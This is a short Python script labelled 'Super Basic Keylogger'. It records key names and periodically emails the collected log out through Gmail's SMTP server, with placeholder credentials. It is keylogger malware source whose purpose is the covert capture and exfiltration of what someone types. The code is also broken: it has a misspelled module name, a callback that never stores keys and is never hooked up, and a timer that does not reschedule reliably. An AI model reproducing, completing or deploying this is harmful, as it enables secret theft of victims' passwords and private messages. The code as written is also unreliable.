#Super Basic Keylogger
#no changes made so far 

import keyboard 
import smtplib 
from threading import Semaphore, Timer 

SEND_REPORT_EVERY = 600
EMAIL_ADDRESS = "blah"
EMAIL_PASSWORD = "blah"

class Keylogger:
	def __init__(self,interval):
		self.interval = interval
		self.log = ""
		self.semaphore = Semaphore(0)
	def callback (self,event):
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name ==  "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
	def sendmail(self,email,password, message):
		server = smtpblib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()

	def report(self):
		if self.log:
			self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
			self.log = ""
			Timer(interval=self.interval, function=self.report).start()
	def start(self):
		self.report()
		self.semaphore.acquire()

if __name__ == "__main__":
	keylogger = Keylogger(interval=SEND_REPORT_EVERY)
	keylogger.start()
				 
